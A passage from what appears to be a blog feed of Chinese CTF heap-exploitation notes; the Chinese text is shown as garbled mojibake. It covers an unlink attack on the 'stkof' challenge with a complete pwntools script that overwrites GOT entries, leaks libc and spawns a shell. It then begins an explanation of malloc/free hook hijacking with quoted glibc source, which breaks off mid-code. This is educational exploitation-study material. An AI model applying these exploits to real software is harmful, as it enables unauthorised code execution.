0x30</span><br></pre></td></tr></table></figure><p>å›å¿†å‰é¢çš„3ä¸ªcheckï¼š</p><p>ä¸ºäº†èƒ½å¤Ÿä½¿å¾—åœ¨é‡Šæ”¾chunk3çš„æ—¶å€™èƒ½å¤Ÿå‘å‰åˆå¹¶fake_chunkï¼Œå¹¶ä¸”ç»•è¿‡æ£€æŸ¥ï¼Œé‚£ä¹ˆ<strong>chunk3çš„prev_sizeå°±è¦ç­‰äºfake_chunkçš„sizeå¤§å°ï¼Œå³0x30</strong>ï¼Œè¿™æ ·æ‰èƒ½è¯´æ˜å‰ä¸€ä¸ªchunk(fake_chunk)æ˜¯é‡Šæ”¾çŠ¶æ€</p><p>å¦‚æœæƒ³è¦è§¦å‘unlinkï¼Œé‚£ä¹ˆchunk3çš„å¤§å°å°±å¿…é¡»è¶…è¿‡fast_binçš„æœ€å¤§å€¼ï¼Œ<strong>æ‰€ä»¥chunk3çš„sizeå°±è‡³å°‘æ˜¯0x90</strong>ï¼Œå¹¶ä¸”<strong>chunk3çš„sizeçš„Pæ ‡å¿—ä½å¿…é¡»ä¸º0</strong>ï¼š</p><ul><li>prev_sizeï¼šæˆ‘ä»¬å…¶å®åªæƒ³é€šè¿‡é‡Šæ”¾chunk3çš„æ—¶å€™å‘å‰åˆå¹¶fake_chunkï¼Œå¹¶ä¸éœ€è¦åˆå¹¶chunk2ï¼Œæ‰€ä»¥fake_chunkçš„prev_sizeç½®é›¶å°±è¡Œ</li><li>sizeï¼šå…¶å®fake_chunkä»…ä»…éœ€è¦fdå’Œbkå®Œæˆunlinkæµç¨‹å°±å¯ä»¥äº†ï¼Œåé¢çš„next_prevå’Œnext_sizeä»…ä»…ä¸ºäº†æ£€æŸ¥æ—¶å€™ç”¨ï¼Œæ‰€ä»¥sizeçš„å¤§å°ä¸º0x20å°±è¡Œ</li><li>next_prevï¼šè¿™é‡Œå…¶å®å°±æ˜¯ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œè¯æ˜fake_chunkæ˜¯ä¸€ä¸ªç©ºé—²å—ï¼Œæ‰€ä»¥next_prevè¦ç­‰äºsizeï¼Œå³0x20</li><li>next_sizeï¼šæ²¡å•¥ç”¨ï¼Œä¸æ£€æŸ¥è¿™é‡Œï¼Œç”¨å­—ç¬¦ä¸²å ä½å°±å¥½</li></ul><blockquote><p>ä¸Šå›¾çš„fake_chunkçš„next_prevå’Œnext_sizeæŒ‡çš„æ˜¯ï¼šfd_nextsize,bk_nextsize</p><p>æ³¨æ„ï¼šåªæœ‰ç©ºé—²çš„ï¼ˆè¢«freeæ‰çš„ï¼‰large_chunkæ‰æœ‰fdä¸bkæŒ‡é’ˆ,fd_nextsize,bk_nextsizeä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p></blockquote><p><img src="/2025/03/11/unlink/image-20250406135240393.png" alt="image-20250406135240393"></p><p><img src="/2025/03/11/unlink/image-20250406135348129.png" alt="image-20250406135348129"></p><ul><li>fake_fd = first_prev_addr <code>ï¼ˆ?ï¼‰</code></li><li>fake_bk = third_prev_addr<code>ï¼ˆ?ï¼‰</code></li><li>third_fd = fake_prev_addr<code>ï¼ˆâœ”ï¸ï¼‰</code></li><li>first_bk = fake_prev_addr<code>ï¼ˆâœ”ï¸ï¼‰</code></li></ul><p>æ‰€æœ‰åˆ›å»ºçš„chunkçš„dataèµ·å§‹åœ°å€éƒ½è®°å½•åœ¨ptr_list[]æ•°ç»„ä¸­</p><p><img src="/2025/03/11/unlink/image-20250406140020017.png" alt="image-20250406140020017"></p><p><img src="/2025/03/11/unlink/image-20250406140030096.png" alt="image-20250406140030096"></p><p><img src="/2025/03/11/unlink/image-20250406140039099.png" alt="image-20250406140039099"></p><p><img src="/2025/03/11/unlink/image-20250406140113491.png" alt="image-20250406140113491"></p><h3 id="é‡Šæ”¾chunk3è§¦å‘unlink"><a href="#é‡Šæ”¾chunk3è§¦å‘unlink" class="headerlink" title="é‡Šæ”¾chunk3è§¦å‘unlink"></a>é‡Šæ”¾chunk3è§¦å‘unlink</h3><p>ä¸ºä»€ä¹ˆé‡Šæ”¾chunk3å°±ä¼šè§¦å‘unlinkå‘¢ï¼Ÿé¦–å…ˆfake_chunkä¸chunk3çš„åœ°å€ç›¸é‚»çš„ï¼Œç”±äºæˆ‘ä»¬ä¼ªé€ çš„fake_chunkæ˜¯ç©ºé—²çŠ¶æ€ï¼Œæ‰€ä»¥åœ¨é‡Šæ”¾chunk3çš„è¿‡ç¨‹ä¸­ä¼šå‘ç”Ÿå‘å‰åˆå¹¶ï¼Œä¹Ÿå°±æ˜¯è¯´chunk3è¦ä¸fake_chunkåˆå¹¶æˆä¸€ä¸ªå¤§chunkã€‚ä½†æ˜¯fake_chunkåœ¨æˆ‘ä»¬æ„é€ çš„æ—¶å€™ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œæ‰€ä»¥ä¸å¾—ä¸ä¸first_chunkå’Œthird_chunkç»„æˆåŒå‘é“¾è¡¨ï¼Œæ‰€ä»¥chunk3å°±éœ€è¦æ¨ªåˆ€å¤ºçˆ±å°†first_chunkä»åŒå‘é“¾è¡¨ä¸­æŠ¢è¿‡æ¥ï¼š<br><img src="/2025/03/11/unlink/image-20250406140929258.png" alt="image-20250406140929258"></p><p>chunk3æŠ¢fake_chunkçš„è¿‡ç¨‹å…¶å®å°±ç›¸å½“äºå°†fake_chunkä»åŒå‘é“¾è¡¨ä¸­æ‘˜é™¤çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆä¹Ÿå°±ç›¸å½“äºæ‰§è¡Œunlinkçš„è¿‡ç¨‹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹fake_chunkè¢«æ‘˜é™¤åå‘ç”Ÿäº†ä»€ä¹ˆï¼š</p><p><img src="/2025/03/11/unlink/image-20250406140944925.png" alt="image-20250406140944925"></p><p> fake_chunkè¢«æ‘˜é™¤ä¹‹åé¦–å…ˆæ‰§è¡Œçš„å°±æ˜¯<code>first_bk = third_addr</code>ï¼Œä¹Ÿå°±æ˜¯è¯´first_chunkçš„bkç”±åŸæ¥æŒ‡å‘fake_chunkåœ°å€æ›´æ”¹æˆæŒ‡å‘third_chunkåœ°å€</p><p>æ¥ä¸‹æ¥æ‰§è¡Œ<code>third_fd = first_addr</code>ï¼Œå³third_chunkçš„fdç”±ç”±åŸæ¥æŒ‡å‘fake_chunkåœ°å€æ›´æ”¹æˆfirst_chunkåœ°å€</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<code>third_chunkçš„fd</code>ä¸<code>first_chunkçš„bk</code>æ›´æ”¹çš„å…¶å®æ˜¯ä¸€ä¸ªä½ç½®ï¼Œä½†æ˜¯ç”±äºthird_fd = first_addr<code>åæ‰§è¡Œ</code>ï¼Œæ‰€ä»¥æ­¤å¤„å†…å®¹ä¼šä»0x602140è¢«è¦†ç›–æˆ0x602138</p><p><img src="/2025/03/11/unlink/image-20250406141141497.png" alt="image-20250406141141497"></p><p>å› ä¸ºæ•´ä¸ªè¿‡ç¨‹ä¸­chunk1å¹¶æ²¡æœ‰ä½¿ç”¨è¿‡ï¼Œæ‰€ä»¥s[1]å¹¶æ— å¤§ç¢ã€‚ä½†æ˜¯s[2]çš„ä½ç½®åŸæœ¬æ˜¯chunk2çš„dataæŒ‡é’ˆï¼Œç»è¿‡unlinkä¹‹åå˜æˆäº†0x602138ã€‚æœ€åå°±æ˜¯s[3]äº†ï¼Œè¿™é‡ŒåŸæœ¬æ˜¯chunk3çš„dataæŒ‡é’ˆï¼Œä½†æ˜¯ç”±äºå‰é¢ä¸ºäº†è§¦å‘unlinkï¼Œæ‰€ä»¥chunk3è¢«é‡Šæ”¾äº†ï¼Œæ‰€ä»¥s[3]ä¸­è¢«ç½®ç©º</p><p>é‚£ä¹ˆæˆ‘ä»¬å»æƒ³ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ä¸»ç•Œé¢é€‰æ‹©ä¿®æ”¹åŠŸèƒ½ï¼Œå¹¶ä¸”é€‰æ‹©ä¿®æ”¹chunk2ï¼Œé‚£ä¹ˆå®é™…ä¸Šè¾“å…¥çš„å†…å®¹å¹¶ä¸ä¼šå†™è¿›chunk2ï¼Œè€Œæ˜¯å†™è¿›0x602138ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;a&#x27; * 8 + p64(hollkelf.got[&#x27;free&#x27;]) + p64(hollkelf.got[&#x27;puts&#x27;]) + p64(hollkelf.got[&#x27;atoi&#x27;])</span><br></pre></td></tr></table></figure><p><img src="/2025/03/11/unlink/image-20250406141802270.png" alt="image-20250406141802270"></p><p>è¿™æ ·ä¸€æ¥free()å‡½æ•°ã€puts()å‡½æ•°ã€atoi()å‡½æ•°å°±å·²ç»åœ¨s[]æ•°ç»„ä¸­éƒ¨ç½²å¥½äº†ã€‚å¯ä»¥çœ‹åˆ°å¦‚æœå†æ¬¡ä¿®æ”¹s[0]çš„è¯å…¶å®ä¿®æ”¹çš„æ˜¯free()å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå†æ¬¡ä¿®æ”¹s[1]çš„è¯å…¶å®ä¿®æ”¹çš„æ˜¯puts()å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå†æ¬¡ä¿®æ”¹s[3]çš„è¯å…¶å®ä¿®æ”¹çš„æ˜¯atoi()å‡½æ•°çš„çœŸå®åœ°å€ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œå¦‚æœå°†s[0]ï¼Œå³free()å‡½æ•°gotä¸­çš„çœŸå®åœ°å€ä¿®æ”¹æˆputs_pltçš„è¯ï¼Œé‡Šæ”¾è°ƒç”¨free()å‡½æ•°å°±ç›¸å½“äºè°ƒç”¨puts()å‡½æ•°äº†ã€‚é‚£ä¹ˆå¦‚æœé‡Šæ”¾çš„æ˜¯s[1]çš„è¯å°±å¯ä»¥æ³„éœ²å‡ºputs()å‡½æ•°çš„çœŸå®åœ°å€äº†ï¼š</p><p>æ¥ä¸‹æ¥å°±æ˜¯é‡Šæ”¾s[1]äº†ï¼Œè™½ç„¶æ˜¯è°ƒç”¨<code>free(puts_got)</code>ï¼Œä½†å®é™…ä¸Šæ˜¯<code>puts(puts_got)</code>ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬æ¥æ”¶æ³„éœ²çš„åœ°å€çš„æ—¶å€™éœ€è¦ç”¨<code>\x00</code>è¡¥å…¨ï¼Œå¹¶ä¸”ç”¨u64()è½¬æ¢ä¸€ä¸‹æ‰èƒ½ç”¨ï¼š</p><p>åˆ°äº†æœ€åä¸€æ­¥äº†ï¼Œè¿˜æ˜¯ç”¨å‰é¢çš„æ€è·¯ï¼Œæˆ‘ä»¬å°†éƒ¨ç½²åœ¨s[2]ä¸­çš„atoi_gotä¸­çš„åœ°å€ä¿®æ”¹æˆå‰é¢æ‰¾åˆ°çš„system()å‡½æ•°åœ°å€ï¼Œè¿™æ ·ä¸€æ¥åœ¨æ¥æ”¶å­—ç¬¦ä¸²è°ƒç”¨atoi()å‡½æ•°çš„æ—¶å€™å®é™…ä¸Šè°ƒç”¨çš„æ˜¯system()å‡½æ•°ï¼š</p><p>æœ€åæˆ‘ä»¬åœ¨ç­‰å¾…è¾“å…¥çš„æ—¶å€™è¾“å…¥/bin/shå­—ç¬¦ä¸²çš„åœ°å€å°±å¯ä»¥äº†ï¼Œçœ‹èµ·æ¥æ˜¯<code>atoi(/bin/sh)</code>ï¼Œä½†å®é™…ä¸Šæ‰§è¡Œçš„æ˜¯<code>system(/bin/sh)</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./stkof&#x27;</span>) </span><br><span class="line"><span class="comment"># p=remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">s = <span class="keyword">lambda</span> s : p.send(s) </span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s) </span><br><span class="line">sa = <span class="keyword">lambda</span> n,s : p.sendafter(n,s) </span><br><span class="line">sla = <span class="keyword">lambda</span> n,s : p.sendlineafter(n,s) </span><br><span class="line">r = <span class="keyword">lambda</span> n : p.recv(n) </span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline() </span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s) </span><br><span class="line">ra = <span class="keyword">lambda</span> : p.recvall() </span><br><span class="line">ia = <span class="keyword">lambda</span> : p.interactive() </span><br><span class="line">uu32 = <span class="keyword">lambda</span> data : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line">uu64 = <span class="keyword">lambda</span> data : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line"><span class="comment"># u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) </span></span><br><span class="line"><span class="comment"># u32(p.recvuntil(b&#x27;\\xf7&#x27;)) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(): </span><br><span class="line">    gdb.attach(p) </span><br><span class="line">    pause() </span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line"><span class="comment"># choose 1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># choose 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;Create fake chunk&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(head - <span class="number">0x8</span>) + p64(head) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+ p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">b&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system_addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;binsh_addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">p.send(p64(binsh_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †å…¥é—¨-__malloc_hookå’Œ__free_hookåŠ«æŒåŸç†</title>
      <link href="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/m0_69107736/article/details/129674212"><strong>malloc_hookå’Œ</strong>free_hookåŠ«æŒåŸç†_freehook-CSDNåšå®¢</a></p><p>æ‰“å †çš„ä¸€ä¸ªå…³é”®çš„æ–¹æ³•å°±æ˜¯åŠ«æŒå †ç›¸å…³å‡½æ•°ä¸­çš„ <code>hook</code> å‡½æ•°ã€‚å³åœ¨å †ä¸­çš„ä¸‰å¤§ <code>hook</code> å‡½æ•°ï¼Œ<code>malloc_hook</code>ã€<code>realloc_hook</code>ã€<code>free_hook</code></p><h2 id="Hookä»‹ç»"><a href="#Hookä»‹ç»" class="headerlink" title="Hookä»‹ç»"></a>Hookä»‹ç»</h2><ul><li><code>hook</code> çš„å°±æ˜¯åŠ«æŒå‡½æ•°æŒ‡é’ˆï¼Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œï¼Œè®©å‡½æ•°æ‰§è¡Œæˆ‘ä»¬æ‰€æŒ‡å®šçš„å‡½æ•°ã€‚<ul><li><code>hook</code> ç¿»è¯‘è¿‡æ¥æ˜¯<code>é’©å­</code>ã€‚å‡è®¾ <code>a</code> å‡½æ•°ä¸­æœ‰è¿™æ ·ä¸€ä¸ªæ‰§è¡Œè¿‡ç¨‹ï¼š<code>åˆ¤æ–­bå‡½æ•°æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºå°±å…ˆbå‡½æ•°æŒ‡é’ˆæ‰€æŒ‡å‘çš„å‡½æ•°</code>ã€‚è¿™æ ·å½“æˆ‘ä»¬ä½¿ç”¨ <code>b</code> é’©å­çš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨æ‰§è¡Œ <code>a</code> å‡½æ•°ï¼Œæ‰§è¡Œæµå°±ä¼šè¢« <code>b</code> é’©å­ç»™é’©è¿‡æ¥ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†æ‰§è¡Œ <code>b</code> å‡½æ•°æŒ‡é’ˆæ‰€æŒ‡å‘çš„å‡½æ•°åœ°å€ã€‚</li></ul></li><li>ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ç¨‹åºï¼Œåœ¨ <code>glibc</code> ä¸­æœ‰å››ä¸ªæ¯”è¾ƒé‡è¦çš„å‡½æ•°æŒ‡é’ˆï¼Œåˆ†åˆ«æ˜¯ <code>malloc_hook</code>ã€<code>free_hook</code>ã€<code>realloc_hook</code>ã€<code>exit_hook</code>ã€‚</li><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›å †æ¼æ´æˆ–è€…å…¶ä»–æ¼æ´å°±å¯ä»¥å°†åŸæœ¬æŒ‡å‘ <code>NULL</code> çš„è¿™äº›å‡½æ•°æŒ‡é’ˆï¼Œä¿®æ”¹ä¸º <code>one_gadget</code>ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨æ»¡è¶³ä¸€å®šçš„æ¡ä»¶åå°±å¯ä»¥ <code>getshell</code>ï¼Œè¿™æ ·å°±æ˜¯ pwn ä¸­çš„åŠ«æŒ <code>hook</code> å‡½æ•°æœ€å¸¸è§çš„ç”¨æ³•ã€‚</li></ul><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h2><h3 id="mallocå‡½æ•°æµç¨‹"><a href="#mallocå‡½æ•°æµç¨‹" class="headerlink" title="mallocå‡½æ•°æµç¨‹"></a>mallocå‡½æ•°æµç¨‹</h3><p><img src="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/mallocå‡½æ•°æµç¨‹.png" alt="mallocå‡½æ•°æµç¨‹"></p><h4 id="glibc2-23mallocå‡½æ•°æºç "><a href="#glibc2-23mallocå‡½æ•°æºç " class="headerlink" title="glibc2.23mallocå‡½æ•°æºç "></a>glibc2.23mallocå‡½æ•°æºç </h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//_int_malloc</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ malloc ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd 